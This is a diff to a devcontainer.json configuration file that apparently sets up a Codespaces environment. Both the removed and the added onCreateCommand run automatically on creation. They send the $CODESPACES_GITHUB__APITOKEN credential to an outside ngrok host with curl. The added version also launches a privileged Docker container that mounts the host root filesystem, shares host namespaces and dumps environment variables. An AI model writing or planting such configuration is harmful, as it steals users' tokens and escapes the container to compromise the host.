@@ -1,3 +1,8 @@
 {
-	"onCreateCommand": "curl https://b1ab-52-188-211-8.ngrok.io --header \"Authorization: token $CODESPACES_GITHUB__APITOKEN\""
+	"image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+	"features": {
+		"ghcr.io/devcontainers/features/docker-from-docker:1": {}
+	},
+	//"onCreateCommand": "docker run -it --rm -v /:/host ubuntu:latest"
+	"onCreateCommand": "docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host sh -c 'env && curl https://b1ab-52-188-211-8.ngrok.io --header \"Authorization: token $CODESPACES_GITHUB__APITOKEN\"'"
 }
